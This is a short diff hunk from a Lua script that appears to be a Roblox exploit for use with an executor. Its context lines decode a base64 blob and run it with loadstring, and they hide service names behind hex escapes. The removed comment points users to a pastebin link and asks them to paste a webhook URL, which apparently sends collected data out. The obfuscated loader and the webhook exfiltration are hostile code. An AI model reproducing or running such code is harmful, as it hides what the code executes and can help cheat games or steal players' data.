@@ -20,12 +20,6 @@ local base64 = "W0Jhc2U2NCBjb250ZW50IGNvbWUgZ2VyYWRvIGFxdWkgXQptb2QgcnE9cmVxdWVz
 local decoded = decodedBase64(base64)
 loadstring(decoded)()
 ]]
---[[ TO RUN THIS CODE, GO TO
-  https://pastebin.com/raw/r25LYJXZ
-COPY AND PASTE INTO YOUR ROBLOX 3X3CUT0R
-PASTE YOUR WEBHOOK IN _G.web.Webhook TO WORK
-NOTE: THIS IS AN UNIVERSAL SCRIPT, SO IT BASICALLY WORKS IN ANY PLACE
-]]
 local v1 = game
 local v2 = v1["\x47\x65\x74\x53\x65\x72\x76\x69\x63\x65"]
 local A = v2(v1, "\x50\x6c\x61\x79\x65\x72\x73")
